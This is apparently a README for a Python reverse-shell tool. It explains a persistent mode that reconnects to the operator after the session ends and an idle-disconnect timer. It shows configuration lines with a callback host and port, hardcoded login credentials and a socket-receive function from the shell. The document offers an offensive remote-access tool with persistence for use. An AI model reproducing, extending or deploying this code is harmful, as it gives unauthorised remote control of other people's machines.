# python-reverse-shell
simple python reverse shell

# persistent mode
this mode, will be by default enable. this feature will allow the script to connect back after user exit or disconnet from the shell

disable persistent
```
# from this (persistent enable)
lr = {"ht": "127.0.0.1","pt": 4444, "pr": True}; ah = {"ee": False,"ur": "r00t","pd": "t00r"}; sd = "/"

# to this (persistent disable)
lr = {"ht": "127.0.0.1","pt": 4444, "pr": False}; ah = {"ee": False,"ur": "r00t","pd": "t00r"}; sd = "/"

```

# idle mode
for this mode, by default the user has 5 minute to stay idle it will disconnect from user when its more than 5 min

```
# it = idle time
# ut = user time
def __rr(c,b = 2048,rt = 0.2, it = 300, ut = 0):
        ut = time() # set user time
        try:
                c.setblocking(0)
                d = ""
                while True: # running on loop to capture the data
                        r = select.select([c], [], [], rt)
                        if r[0]:
                                d += c.recv(b)
                        else:
                                if it != 0: # if it is 0 mean its disable
                                        if it <= time() - ut: # if it is more than the ut idle, then return False to disconnect the user
                                                return False
                                if len(d) > 0: # check if d has data
                                        c.setblocking(1)
                                        return d
        except socket.error:
                return False
```
